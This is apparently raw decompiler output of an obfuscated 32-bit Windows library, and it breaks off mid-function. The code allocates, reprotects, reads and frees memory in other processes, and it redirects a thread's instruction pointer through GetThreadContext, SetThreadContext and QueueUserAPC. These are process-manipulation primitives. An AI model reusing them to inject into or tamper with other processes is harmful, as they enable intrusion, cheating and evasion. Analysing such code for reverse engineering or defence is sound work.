int __userpurge sub_10029947@<eax>(int a1@<esi>, _DWORD *a2)
{
  char v3; // [esp+7h] [ebp-15h] BYREF
  _DWORD v4[2]; // [esp+8h] [ebp-14h] BYREF
  int v5; // [esp+18h] [ebp-4h]

  *(_DWORD *)a1 = off_100747E0;
  *(_DWORD *)(a1 + 4) = *a2;
  sub_10003044(v4);
  v5 = 0;
  sub_1000FD49();
  sub_10011A18((__int32)&v3, (int)&v3);
  sub_1002958C((int *)dword_10091DBC, *(_DWORD *)(a1 + 4));
  *(_BYTE *)(a1 + 8) = 1;
  v5 = -1;
  sub_10003077(v4);
  return a1;
}
// 100747E0: using guessed type int (__thiscall *off_100747E0[2])(void *Block, char);
// 10091DBC: using guessed type int dword_10091DBC;
// 10029947: using guessed type _DWORD var_14[2];

//----- (100299D5) --------------------------------------------------------
_DWORD *__thiscall sub_100299D5(_DWORD *Block, char a2)
{
  sub_10029A1B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100299F4) --------------------------------------------------------
int __usercall sub_100299F4@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int result; // eax
  char v3; // [esp+1h] [ebp-1h] BYREF

  v3 = HIBYTE(a1);
  if ( *(_BYTE *)(a2 + 8) )
  {
    sub_10011A18((__int32)&v3, (int)&v3);
    result = sub_100294D3((int *)dword_10091DBC, *(_DWORD *)(a2 + 4));
    *(_BYTE *)(a2 + 8) = 0;
  }
  return result;
}
// 10091DBC: using guessed type int dword_10091DBC;

//----- (10029A1B) --------------------------------------------------------
int __thiscall sub_10029A1B(_DWORD *this)
{
  *this = off_100747E0;
  return sub_100299F4((int)this, (int)this);
}
// 100747E0: using guessed type int (__thiscall *off_100747E0[2])(void *Block, char);

//----- (10029A51) --------------------------------------------------------
_DWORD *__usercall sub_10029A51@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10011DC3((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10029A76) --------------------------------------------------------
int __stdcall sub_10029A76(int a1, int a2, int a3)
{
  *(_DWORD *)a1 = &off_10072BE8;
  *(_DWORD *)a1 = &off_10073694;
  *(_BYTE *)(a1 + 4) = 1;
  sub_10009F32((_DWORD *)(a1 + 8), a2);
  sub_10009F32((_DWORD *)(a1 + 16), a3);
  *(_DWORD *)(a1 + 24) = 0;
  sub_10009D2C((_DWORD *)(a1 + 28), &word_1008E5C4);
  return a1;
}
// 10072BE8: using guessed type int (__thiscall *off_10072BE8)(void *Block, char);
// 10073694: using guessed type int (__thiscall *off_10073694)(void *Block, char);

//----- (10029AF9) --------------------------------------------------------
bool __userpurge sub_10029AF9@<al>(int a1@<esi>, void *a2)
{
  int v3; // eax
  char v4; // bl
  bool v5; // zf
  _DWORD *v6; // eax
  int v7[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+18h] [ebp-14h]
  int v9; // [esp+1Ch] [ebp-10h]
  int v10; // [esp+28h] [ebp-4h]

  v9 = 0;
  if ( !*(_DWORD *)(a1 + 24) )
    return 1;
  v3 = sub_1001C857(a2);
  v4 = 1;
  v5 = *(_DWORD *)(a1 + 24) == 1;
  v8 = v3;
  if ( !v5 || v3 != 1 || (v6 = sub_1001C4C8(a2, v7), v10 = 0, v9 = 1, sub_1000A1C0((int)v6, a1 + 28)) )
    v4 = 0;
  v10 = -1;
  if ( (v9 & 1) != 0 )
  {
    v9 &= ~1u;
    sub_10009F65(v7);
  }
  return v4 || *(_DWORD *)(a1 + 24) == 4 && v8 == 4 && *(_DWORD *)(a1 + 36) == sub_1001C3F4(a2);
}

//----- (10029B8C) --------------------------------------------------------
BOOL __thiscall sub_10029B8C(_BYTE *this)
{
  bool v2; // bl
  _DWORD *v3; // eax
  int v5[5]; // [esp+10h] [ebp-40h] BYREF
  int pExceptionObject[3]; // [esp+24h] [ebp-2Ch] BYREF
  int v7[2]; // [esp+30h] [ebp-20h] BYREF
  char v8[17]; // [esp+3Bh] [ebp-15h] BYREF
  int v9; // [esp+4Ch] [ebp-4h]

  v9 = 0;
  sub_100091F2((int)v8);
  v8[0] = 1;
  if ( (unsigned __int8)sub_1001DD72((_DWORD *)dword_10091D5C) )
  {
    sub_1001DD41(pExceptionObject, (int)(this + 8));
    LOBYTE(v9) = 1;
    sub_10009D2C(v7, &word_1008E5C8);
    LOBYTE(v9) = 2;
    v2 = sub_1000A1C0((int)v7, (int)(this + 16)) != 0;
    LOBYTE(v9) = 1;
    sub_10009F65(v7);
    if ( v2 )
    {
      if ( sub_1001E2BE((int)pExceptionObject, (int)(this + 16)) )
      {
        v3 = sub_1001E30F((int)pExceptionObject, v5, (int)(this + 16));
        LOBYTE(v9) = 3;
        v8[0] = sub_10029AF9((int)this, v3);
        LOBYTE(v9) = 1;
        sub_1001C2B3(v5);
      }
      else
      {
        v8[0] = 0;
      }
    }
    LOBYTE(v9) = 0;
    sub_1001DFCF(pExceptionObject);
  }
  else
  {
    v8[0] = 0;
  }
  if ( this[4] )
    return (unsigned __int8)v8[0];
  else
    return v8[0] == 0;
}
// 10091D5C: using guessed type int dword_10091D5C;
// 10029B8C: using guessed type char var_15[17];

//----- (10029C77) --------------------------------------------------------
_DWORD *__stdcall sub_10029C77(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_1007483C;
  return a1;
}
// 1007483C: using guessed type int (__thiscall *off_1007483C)(void *Block, char);

//----- (10029CA5) --------------------------------------------------------
_DWORD *__thiscall sub_10029CA5(_DWORD *Block, char a2)
{
  sub_10029CC4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029CC4) --------------------------------------------------------
void __thiscall sub_10029CC4(_DWORD *this)
{
  *this = &off_1007483C;
  sub_1000DF1A(this);
}
// 1007483C: using guessed type int (__thiscall *off_1007483C)(void *Block, char);

//----- (10029CE8) --------------------------------------------------------
int __userpurge sub_10029CE8@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4)
{
  _DWORD *v5; // edx
  int v7; // [esp-8h] [ebp-40h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+10h] [ebp-28h] BYREF
  int v9; // [esp+34h] [ebp-4h]

  sub_10019FEC(a3);
  v9 = 0;
  sub_10025BDE(a3 + 8);
  *(_DWORD *)a3 = &off_100747E4;
  *v5 = &off_10074810;
  sub_100114E7(a2, (_DWORD *)(a3 + 16));
  LOBYTE(v9) = 2;
  *(_DWORD *)(a3 + 28) = 0;
  *(_DWORD *)(a3 + 32) = a1;
  *(_DWORD *)(a3 + 36) = a4;
  *(_BYTE *)(a3 + 40) = 0;
  if ( !a4 )
  {
    sub_10029E64(a3, &Buffer);
    *(_DWORD *)(a3 + 36) = Buffer.RegionSize;
    v7 = a1 - (unsigned int)Buffer.BaseAddress;
    *(_DWORD *)(a3 + 32) = Buffer.BaseAddress;
    sub_1002A2C1((_DWORD *)a3, v7, 0);
  }
  return a3;
}
// 10029D1A: variable 'v5' is possibly undefined
// 100747E4: using guessed type int (__thiscall *off_100747E4)(void *Block, char);
// 10074810: using guessed type int (__stdcall *off_10074810)(int);

//----- (10029D6D) --------------------------------------------------------
void *__thiscall sub_10029D6D(void *Block, char a2)
{
  sub_10029DE8((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029D8C) --------------------------------------------------------
int __stdcall sub_10029D8C(int a1)
{
  _DWORD *v1; // edx

  sub_10019FEC(a1);
  sub_10025BDE(a1 + 8);
  *(_DWORD *)a1 = &off_100747E4;
  *v1 = &off_10074810;
  sub_1001EB43((_DWORD *)(a1 + 16), 0, 0);
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  *(_BYTE *)(a1 + 40) = 0;
  return a1;
}
// 10029DBF: variable 'v1' is possibly undefined
// 100747E4: using guessed type int (__thiscall *off_100747E4)(void *Block, char);
// 10074810: using guessed type int (__stdcall *off_10074810)(int);

//----- (10029DE8) --------------------------------------------------------
int __thiscall sub_10029DE8(int this)
{
  *(_DWORD *)this = &off_100747E4;
  *(_DWORD *)(this + 8) = &off_10074810;
  if ( *(_BYTE *)(this + 40) )
    sub_1002A319(this);
  sub_10009696((int *)(this + 16));
  sub_10025C2C(this != 0 ? (_BYTE *)(this + 8) : 0);
  return sub_1001A03A((_BYTE *)this);
}
// 100747E4: using guessed type int (__thiscall *off_100747E4)(void *Block, char);
// 10074810: using guessed type int (__stdcall *off_10074810)(int);

//----- (10029E64) --------------------------------------------------------
SIZE_T __userpurge sub_10029E64@<eax>(int a1@<esi>, PMEMORY_BASIC_INFORMATION lpBuffer)
{
  SIZE_T result; // eax
  _DWORD v3[3]; // [esp+0h] [ebp-Ch] BYREF

  memset(lpBuffer, 0, sizeof(struct _MEMORY_BASIC_INFORMATION));
  result = VirtualQueryEx(*(HANDLE *)(*(_DWORD *)(a1 + 20) + 16), *(LPCVOID *)(a1 + 32), lpBuffer, 0x1Cu);
  if ( !result )
  {
    sub_10029C77(&lpBuffer);
    _CxxThrowException(&lpBuffer, (_ThrowInfo *)&_TI2_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__);
  }
  if ( result != 28 )
  {
    sub_1000E2E3(v3, 1);
    _CxxThrowException(v3, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10029E64: using guessed type _DWORD var_C[3];

//----- (10029F50) --------------------------------------------------------
int __userpurge sub_10029F50@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_100126AF();
  *(_DWORD *)(a1 + 32) = a2[8];
  *(_DWORD *)(a1 + 36) = a2[9];
  *(_DWORD *)(a1 + 28) = a2[7];
  *(_BYTE *)(a1 + 40) = 0;
  return a1;
}
// 100126AF: using guessed type int sub_100126AF(void);

//----- (10029F8C) --------------------------------------------------------
DWORD __usercall sub_10029F8C@<eax>(int a1@<esi>)
{
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-1Ch] BYREF

  sub_10029E64(a1, &Buffer);
  return Buffer.Protect;
}

//----- (10029FA0) --------------------------------------------------------
char *__thiscall sub_10029FA0(char *this)
{
  return this + 16;
}

//----- (10029FA4) --------------------------------------------------------
DWORD __usercall sub_10029FA4@<eax>(int a1@<esi>)
{
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-1Ch] BYREF

  sub_10029E64(a1, &Buffer);
  return Buffer.State;
}

//----- (10029FC8) --------------------------------------------------------
BOOL __usercall sub_10029FC8@<eax>(int a1@<esi>)
{
  return sub_10029FA4(a1) == 0x10000;
}

//----- (10029FD8) --------------------------------------------------------
BOOL __usercall sub_10029FD8@<eax>(int a1@<esi>)
{
  return sub_10029FA4(a1) == 0x2000;
}

//----- (1002A03E) --------------------------------------------------------
int __thiscall sub_1002A03E(int this, int pExceptionObject)
{
  _DWORD v4[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v5[3]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v6[3]; // [esp+28h] [ebp-10h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  if ( !sub_10029FD8(this) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6[0] = 128;
  sub_10029947((int)v4, v6);
  v7 = 0;
  if ( !VirtualAllocEx(
          *(HANDLE *)(*(_DWORD *)(this + 20) + 16),
          *(LPVOID *)(this + 32),
          *(_DWORD *)(this + 36),
          0x1000u,
          pExceptionObject) )
  {
    sub_1000E2E3(v5, 1);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v7 = -1;
  return sub_10029A1B(v4);
}
// 1002A03E: using guessed type int var_10[3];
// 1002A03E: using guessed type _DWORD var_28[3];
// 1002A03E: using guessed type _DWORD var_1C[3];

//----- (1002A0CB) --------------------------------------------------------
int __thiscall sub_1002A0CB(_DWORD *this)
{
  return this[7] - this[5];
}

//----- (1002A0D2) --------------------------------------------------------
DWORD __userpurge sub_1002A0D2@<eax>(int a1@<edi>, DWORD flNewProtect)
{
  int v2; // eax
  DWORD v3; // esi
  _DWORD v5[3]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD pExceptionObject[3]; // [esp+1Ch] [ebp-20h] BYREF
  int v7; // [esp+28h] [ebp-14h] BYREF
  DWORD flOldProtect[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v7 = 128;
  sub_10029947((int)v5, &v7);
  v9 = 0;
  v2 = *(_DWORD *)(a1 + 20);
  flOldProtect[0] = 0;
  if ( !VirtualProtectEx(*(HANDLE *)(v2 + 16), *(LPVOID *)(a1 + 32), *(_DWORD *)(a1 + 36), flNewProtect, flOldProtect) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v3 = flOldProtect[0];
  v9 = -1;
  sub_10029A1B(v5);
  return v3;
}
// 1002A0D2: using guessed type _DWORD var_2C[3];
// 1002A0D2: using guessed type DWORD flOldProtect[3];
// 1002A0D2: using guessed type _DWORD pExceptionObject[3];

//----- (1002A148) --------------------------------------------------------
int __thiscall sub_1002A148(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  wchar_t *v4; // eax
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // ebx
  int v11; // [esp-10h] [ebp-54h] BYREF
  int v12; // [esp-Ch] [ebp-50h]
  int v13; // [esp-8h] [ebp-4Ch] BYREF
  _ThrowInfo *v14; // [esp-4h] [ebp-48h]
  int v15; // [esp+14h] [ebp-30h] BYREF
  void *v16; // [esp+18h] [ebp-2Ch] BYREF
  int pExceptionObject[3]; // [esp+1Ch] [ebp-28h] BYREF
  _DWORD v18[4]; // [esp+28h] [ebp-1Ch] BYREF
  int v19; // [esp+40h] [ebp-4h]

  result = a2[3];
  if ( result )
  {
    if ( (unsigned int)(result + this[7]) > this[9] )
    {
      sub_1000E01D(pExceptionObject);
      v14 = (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__;
      goto LABEL_4;
    }
    v15 = 0;
    v4 = (wchar_t *)sub_1000BE16((int)&unk_1008E578);
    v13 = v5;
    pExceptionObject[0] = (int)&v13;
    sub_10009D2C(&v13, v4);
    v19 = 0;
    v12 = v6;
    v11 = v6;
    v16 = &v11;
    sub_10009F32(&v11, (int)&unk_10095608);
    v19 = -1;
    pExceptionObject[0] = (int)sub_100265E5(v11, v12, v13);
    v16 = (void *)128;
    sub_10029947((int)v18, &v16);
    v19 = 2;
    v7 = a2[3];
    v14 = (_ThrowInfo *)&v15;
    v13 = v7;
    v8 = sub_1000C52E(a2);
    if ( !((int (__stdcall *)(int, int, int, int, _ThrowInfo *))pExceptionObject[0])(
            v9,
            this[7] + this[8],
            v8,
            v13,
            v14)
      || (v10 = a2[3], v15 != v10) )
    {
      sub_1000E2E3(pExceptionObject, 1);
      v14 = (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__;
LABEL_4:
      _CxxThrowException(pExceptionObject, v14);
    }
    this[7] += v10;
    v19 = -1;
    return sub_10029A1B(v18);
  }
  return result;
}
// 1002A1B6: variable 'v5' is possibly undefined
// 1002A1C9: variable 'v6' is possibly undefined
// 1002A22F: variable 'v9' is possibly undefined
// 1002A148: using guessed type _DWORD var_1C[4];

//----- (1002A27F) --------------------------------------------------------
LONG __thiscall sub_1002A27F(void *this, char a2)
{
  int v3; // eax
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  v3 = sub_1000C28D((void *)1, (int)v5, &a2);
  v6 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, v3);
  v6 = -1;
  return sub_1000C45D(v5);
}
// 1002A27F: using guessed type int var_20[7];

//----- (1002A2BD) --------------------------------------------------------
int __thiscall sub_1002A2BD(_DWORD *this)
{
  return this[7];
}

//----- (1002A2C1) --------------------------------------------------------
unsigned int __thiscall sub_1002A2C1(_DWORD *this, int pExceptionObject, int a3)
{
  int v3; // eax
  unsigned int result; // eax
  _DWORD v5[2]; // [esp+0h] [ebp-8h] BYREF

  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[7];
    }
    else
    {
      if ( a3 != 2 )
      {
        sub_1000DEEF(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
      v3 = this[9];
    }
    result = pExceptionObject + v3;
  }
  else
  {
    result = pExceptionObject;
  }
  if ( result >= this[9] )
  {
    sub_1000E01D(v5);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[7] = result;
  return result;
}
// 1002A2C1: using guessed type _DWORD var_8[2];

//----- (1002A319) --------------------------------------------------------
BOOL __usercall sub_1002A319@<eax>(int a1@<eax>)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  result = sub_10029FC8(a1);
  if ( !result )
  {
    result = VirtualFreeEx(*(HANDLE *)(*(_DWORD *)(a1 + 20) + 16), *(LPVOID *)(a1 + 32), 0, 0x8000u);
    if ( !result )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  return result;
}
// 1002A319: using guessed type _DWORD pExceptionObject[3];

//----- (1002A361) --------------------------------------------------------
SIZE_T __thiscall sub_1002A361(_DWORD *this, _DWORD *nSize)
{
  int v5; // eax
  char v6; // bl
  void *v7; // eax
  BOOL v8; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-14h] BYREF
  HANDLE hProcess; // [esp+10h] [ebp-8h]
  SIZE_T NumberOfBytesRead; // [esp+14h] [ebp-4h] BYREF
  unsigned int nSizea; // [esp+20h] [ebp+8h]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  nSizea = nSize[3];
  if ( nSizea >= this[7] - this[5] )
    nSizea = this[7] - this[5];
  v5 = nSize[1];
  NumberOfBytesRead = 0;
  v6 = *(_BYTE *)(v5 + 8);
  hProcess = *(HANDLE *)(this[3] + 16);
  v7 = (void *)sub_1000C50A(nSize);
  v8 = ReadProcessMemory(hProcess, (LPCVOID)(this[5] + this[6]), v7, nSizea, &NumberOfBytesRead);
  if ( v6 )
    *(_BYTE *)(nSize[1] + 8) = 1;
  if ( !v8 || NumberOfBytesRead != nSizea )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  this[5] += nSizea;
  return NumberOfBytesRead;
}
// 1002A361: using guessed type _DWORD pExceptionObject[3];

//----- (1002A400) --------------------------------------------------------
char sub_1002A400()
{
  return 1;
}

//----- (1002A403) --------------------------------------------------------
int __thiscall sub_1002A403(void *this, _BYTE *a2)
{
  int v3; // esi
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  sub_1000C28D((void *)1, (int)v5, 0);
  v6 = 0;
  v3 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v5);
  if ( v3 == 1 )
    *a2 = *(_BYTE *)sub_1000C55B((int)v5, 0);
  v6 = -1;
  sub_1000C45D(v5);
  return v3;
}
// 1002A403: using guessed type int var_20[7];

//----- (1002A45B) --------------------------------------------------------
BOOL __thiscall sub_1002A45B(_DWORD *this)
{
  return this[5] >= this[7];
}

//----- (1002A46D) --------------------------------------------------------
void *__thiscall sub_1002A46D(char *this, char a2)
{
  return sub_10029D6D(this - 8, a2);
}

//----- (1002A475) --------------------------------------------------------
int __thiscall sub_1002A475(_DWORD *this)
{
  return sub_1002A2BD(this - 2);
}

//----- (1002A47D) --------------------------------------------------------
char sub_1002A47D()
{
  return sub_1002A400();
}

//----- (1002A485) --------------------------------------------------------
unsigned int __thiscall sub_1002A485(_DWORD *this, int a2, int a3)
{
  return sub_1002A2C1(this - 2, a2, a3);
}

//----- (1002A49B) --------------------------------------------------------
_DWORD *__thiscall sub_1002A49B(_DWORD *Block, char a2)
{
  sub_1002A4BF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A4BF) --------------------------------------------------------
void __thiscall sub_1002A4BF(_DWORD *this)
{
  bool v2; // cf
  int (__thiscall **pExceptionObject)(void *, char); // [esp+8h] [ebp-Ch] BYREF
  char v4; // [esp+Ch] [ebp-8h]
  int v5; // [esp+10h] [ebp-4h]

  v2 = this[2] < 0x32u;
  *this = off_10074898;
  if ( !v2 )
    ExitThread(0);
  if ( *((_BYTE *)this + 4) && !__uncaught_exception() && !sub_1000DE59() )
  {
    v5 = this[2] + 1;
    pExceptionObject = off_10074898;
    v4 = 1;
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__);
  }
}
// 10074898: using guessed type int (__thiscall *off_10074898[2])(void *Block, char);

//----- (1002A516) --------------------------------------------------------
_BYTE *__thiscall sub_1002A516(_BYTE *this, int a2)
{
  _BYTE *result; // eax

  result = this;
  *(_DWORD *)this = off_10074898;
  this[4] = *(_BYTE *)(a2 + 4);
  *((_DWORD *)this + 2) = *(_DWORD *)(a2 + 8);
  return result;
}
// 10074898: using guessed type int (__thiscall *off_10074898[2])(void *Block, char);

//----- (1002A534) --------------------------------------------------------
LPVOID sub_1002A534()
{
  LPVOID result; // eax

  result = TlsGetValue(dword_10095614);
  if ( !result )
    return (LPVOID)sub_10025818();
  return result;
}

//----- (1002A54A) --------------------------------------------------------
int __stdcall sub_1002A54A(int a1)
{
  sub_1000F2B5((_DWORD *)a1, 0, 0);
  *(_DWORD *)a1 = &off_10074848;
  sub_10012CF1(a1 + 12);
  sub_1002BFDC((_DWORD *)(a1 + 48));
  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 88) = 0;
  *(_DWORD *)(a1 + 92) = 0;
  *(_BYTE *)(a1 + 96) = 0;
  return a1;
}
// 10074848: using guessed type int (__thiscall *off_10074848)(void *Block, char);

//----- (1002A5A1) --------------------------------------------------------
int *__thiscall sub_1002A5A1(int *Block, char a2)
{
  sub_1002A893(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A5C0) --------------------------------------------------------
void __stdcall __noreturn pfnAPC(ULONG_PTR Parameter)
{
  int (__thiscall **pExceptionObject)(void *, char); // [esp+0h] [ebp-Ch] BYREF
  char v2; // [esp+4h] [ebp-8h]
  int v3; // [esp+8h] [ebp-4h]

  if ( !__uncaught_exception() && !sub_1000DE59() )
  {
    v3 = 0;
    pExceptionObject = off_10074898;
    v2 = 1;
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__);
  }
  ExitThread(0);
}
// 10074898: using guessed type int (__thiscall *off_10074898[2])(void *Block, char);

//----- (1002A5FD) --------------------------------------------------------
void __thiscall sub_1002A5FD(int this, int a2)
{
  int v3; // eax
  void *v4; // eax
  int v5; // eax
  void *v6; // eax
  void *v7; // eax
  BOOL pExceptionObject; // [esp+10h] [ebp-30Ch] BYREF
  _DWORD v9[2]; // [esp+14h] [ebp-308h] BYREF
  _DWORD v10[3]; // [esp+1Ch] [ebp-300h] BYREF
  _DWORD v11[3]; // [esp+28h] [ebp-2F4h] BYREF
  CONTEXT Context; // [esp+34h] [ebp-2E8h] BYREF
  int v13; // [esp+318h] [ebp-4h]

  sub_10012C8B((int *)(this + 12), v9);
  v13 = 0;
  if ( *(_DWORD *)(this + 88) != 3 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1002A954((int *)this);
  v13 = -1;
  sub_10012CBF(v9);
  *(_BYTE *)(this + 96) = 1;
  memset(&Context.Dr0, 0, 0x2C8u);
  v3 = *(_DWORD *)this;
  Context.ContextFlags = 65599;
  v4 = (void *)(*(int (__thiscall **)(int))(v3 + 60))(this);
  if ( !GetThreadContext(v4, &Context) )
  {
    sub_1002A9CC((int *)this);
    sub_1000E2E3(v10, 1);
    _CxxThrowException(v10, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = *(_DWORD *)this;
  Context.Eip = (DWORD)pfnAPC;
  v6 = (void *)(*(int (__thiscall **)(int))(v5 + 60))(this);
  pExceptionObject = SetThreadContext(v6, &Context);
  sub_1002A9CC((int *)this);
  v7 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)this + 60))(this);
  QueueUserAPC((PAPCFUNC)pfnAPC, v7, 0);
  PostThreadMessageA(*(_DWORD *)(this + 8), 0, 0, 0);
  if ( !pExceptionObject )
  {
    sub_1000E2E3(v11, 1);
    _CxxThrowException(v11, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10014CC5(this, a2, 0);
  *(_DWORD *)(this + 88) = 7;
  sub_1002AC27((_DWORD *)this);
}
// 1002A5FD: using guessed type _DWORD var_308[2];
// 1002A5FD: using guessed type _DWORD var_300[3];
// 1002A5FD: using guessed type _DWORD var_2F4[3];

//----- (1002A77E) --------------------------------------------------------
int __thiscall sub_1002A77E(unsigned int *this)
{
  int v2; // eax
  unsigned int v3; // edi
  uintptr_t v4; // eax
  _DWORD v6[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v7[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v8; // [esp+24h] [ebp-14h] BYREF
  _DWORD pExceptionObject[3]; // [esp+28h] [ebp-10h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  sub_10012C8B((int *)this + 3, v7);
  v10 = 0;
  v2 = this[22];
  if ( v2 == 4 )
  {
    sub_1000DEEF(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( v2 && v2 < 5 )
  {
    sub_1000DEEF(&v8);
    _CxxThrowException(&v8, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v3 = *this;
  *((_BYTE *)this + 96) = 0;
  v4 = _beginthreadex(0, 0, (_beginthreadex_proc_type)StartAddress, this, 0, this + 2);
  (*(void (__thiscall **)(unsigned int *, uintptr_t, _DWORD))(v3 + 12))(this, v4, 0);
  if ( !(*(int (__thiscall **)(unsigned int *))(*this + 60))(this)
    || (*(int (__thiscall **)(unsigned int *))(*this + 60))(this) == -1 )
  {
    (*(void (__thiscall **)(unsigned int *, int, _DWORD))(*this + 12))(this, -1, 0);
    sub_1000E2E3(v6, 1);
    _CxxThrowException(v6, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  this[22] = 1;
  v10 = -1;
  return sub_10012CBF(v7);
}
// 1002A77E: using guessed type _DWORD var_1C[2];
// 1002A77E: using guessed type _DWORD pExceptionObject[3];
// 1002A77E: using guessed type _DWORD var_28[3];

//----- (1002A847) --------------------------------------------------------
int __thiscall sub_1002A847(int *this)
{
  int v2; // edi
  int v3; // eax
  _DWORD v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  sub_10012C8B(this + 3, v5);
  v6 = 0;
  v2 = (*(int (__thiscall **)(int *))(*this + 8))(this);
  v3 = *this;
  this[22] = 4;
  (*(void (__thiscall **)(int *, int, _DWORD))(v3 + 12))(this, -1, 0);
  v6 = -1;
  sub_10012CBF(v5);
  return v2;
}
// 1002A847: using guessed type _DWORD var_14[4];

//----- (1002A893) --------------------------------------------------------
void __thiscall sub_1002A893(int *this)
{
  *this = (int)&off_10074848;
  if ( this[22] != 4 )
    sub_1002AB7A(this, 0);
  sub_1002C008(this + 12);
  sub_10012D7D(this + 3);
  sub_1000F307(this);
}
// 10074848: using guessed type int (__thiscall *off_10074848)(void *Block, char);

//----- (1002A8FF) --------------------------------------------------------
int __thiscall sub_1002A8FF(_DWORD *this)
{
  return this[22];
}

//----- (1002A903) --------------------------------------------------------
int sub_1002A903()
{
  return 1;
}

//----- (1002A907) --------------------------------------------------------
int __thiscall sub_1002A907(_DWORD *this)
{
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( this[22] != 6 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return this[23];
}

//----- (1002A92C) --------------------------------------------------------
int __thiscall sub_1002A92C(_DWORD *this)
{
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( this[22] == 4 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(this[1] + 16);
}

//----- (1002A954) --------------------------------------------------------
int __thiscall sub_1002A954(int *this)
{
  int v2; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v5[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  _DWORD v6[4]; // [esp+24h] [ebp-14h] BYREF
